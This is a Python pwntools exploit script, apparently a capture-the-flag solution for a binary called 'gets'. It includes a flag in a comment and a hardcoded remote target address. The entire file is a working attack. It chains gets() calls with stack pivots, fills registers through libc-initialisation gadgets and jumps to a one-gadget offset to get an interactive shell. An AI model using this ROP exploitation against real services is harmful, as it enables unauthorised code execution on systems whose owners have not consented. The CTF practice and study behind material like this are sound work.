#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'
# flag{74276ac9-bf27-431c-be8b-d769244b0a20}
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

BINARY = './gets'
TARGET = ('106.75.4.189', 35273)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
code = ELF(BINARY)
libc = ELF(LIBC64)

rop = ROP(code)
rerop = lambda : ROP(code)

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def migrate(buf):
    global rop
    rop.raw(0x40059d) # pop rsp
    rop.raw(buf-8-0x10)

def sendpayload(payload):
    global rop
    r.sendline(payload)
    rop = rerop()

rop.gets(0x601f00)
migrate(0x601f00)
sendpayload('a'*0x18 + str(rop))

rop.gets(0x601800)
migrate(0x601800)
rop.raw(0x4004F8)
sendpayload(str(rop))

# set edx
rop.raw(0x5a + 0x400540)
rop.raw(0)#pop rbx
rop.raw(0x601ef8-0x48)#pop rbp
rop.raw(0x601f28)#pop r12
rop.raw(0x00007ffff7a0d000 + 0xf02a4 - 0x00007ffff7a7be4e)#pop r13
rop.raw(0)#pop r14
rop.raw(0x601000)#pop r15
rop.raw(0x400580)#ret

migrate(0x601ef8)
sendpayload(str(rop))

r.interactive()

    
